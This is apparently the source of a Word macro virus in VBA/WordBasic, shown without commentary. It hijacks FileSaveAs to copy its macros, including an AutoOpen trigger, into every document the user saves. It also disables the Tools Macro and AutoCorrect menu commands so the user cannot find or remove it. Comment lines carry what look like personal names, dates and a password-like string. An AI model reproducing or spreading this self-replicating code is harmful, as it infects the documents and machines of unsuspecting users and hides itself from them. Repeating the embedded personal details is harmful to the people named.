   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "PrajnaParamitaDiamondSutra"

   Public Sub MAIN()
       Rem CHANKINMANISSHOSHI6F200PBORNINJAPANIN1983W/LB/LS
       Rem CHANM:LIUBOMEIF:CHIUKWONGFUES:CHOISIUHUI
       Rem CHAN13/ES:17/M:30/F:35/RICH
       Rem 1996DEC29INSTFSCFSHF8/F2WPWD/901109
       Rem CHANW/GROWTH->POPULAR
   End Sub

   Attribute VB_Name = "ToolsAutoCorrect"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Adds or deletes AutoCorrect entries"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsAutoCorrect.MAIN"
   'Dim dlg As ToolsAutoCorrect
   'GetCurValues dlg
   'Dialog dlg
   'ToolsAutoCorrect dlg
   'shoshi

   End Sub

   Attribute VB_Name = "CKmBBLsSUNTEmpLE"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   'this becomes the FileSaveAs for the global template
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Bail
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   'If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:CHANKINMANISSHOSHI6F200P", sTMacro$
   sTMacro$ = sMe$ + ":CHANKINMANISSHOSHI6F200P"
   WordBasic.MacroCopy "Global:CHANKINMANISSHOSHI6F200P", sTMacro$
   sTMacro$ = sMe$ + ":CKMBBLSSUNTEMPLE"
   WordBasic.MacroCopy "Global:CKMBBLSSUNTEMPLE", sTMacro$
   sTMacro$ = sMe$ + ":PrajnaParamitaDiamondSutra"
   WordBasic.MacroCopy "Global:PrajnaParamitaDiamondSutra", sTMacro$

   sTMacro$ = sMe$ + ":ToolsMacro"
   WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
   sTMacro$ = sMe$ + ":ToolsAutoCorrect"
   WordBasic.MacroCopy "Global:ToolsAutoCorrect", sTMacro$


   WordBasic.FileSaveAs dlg
   GoTo Done

   Bail:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Done:
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   'Dim dlg As ToolsMacro
   'GetCurValues dlg
   'Dialog dlg
   'ToolsMacro dlg
   'shoshi

   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   'this becomes the FileSaveAs for the global template
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Bail
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   'If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:CHANKINMANISSHOSHI6F200P", sTMacro$
   sTMacro$ = sMe$ + ":CHANKINMANISSHOSHI6F200P"
   WordBasic.MacroCopy "Global:CHANKINMANISSHOSHI6F200P", sTMacro$
   sTMacro$ = sMe$ + ":CKMBBLSSUNTEMPLE"
   WordBasic.MacroCopy "Global:CKMBBLSSUNTEMPLE", sTMacro$
   sTMacro$ = sMe$ + ":PrajnaParamitaDiamondSutra"
   WordBasic.MacroCopy "Global:PrajnaParamitaDiamondSutra", sTMacro$

   sTMacro$ = sMe$ + ":ToolsMacro"
   WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
   sTMacro$ = sMe$ + ":ToolsAutoCorrect"
   WordBasic.MacroCopy "Global:ToolsAutoCorrect", sTMacro$



   WordBasic.FileSaveAs dlg
   GoTo Done

   Bail:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Done:
   End Sub
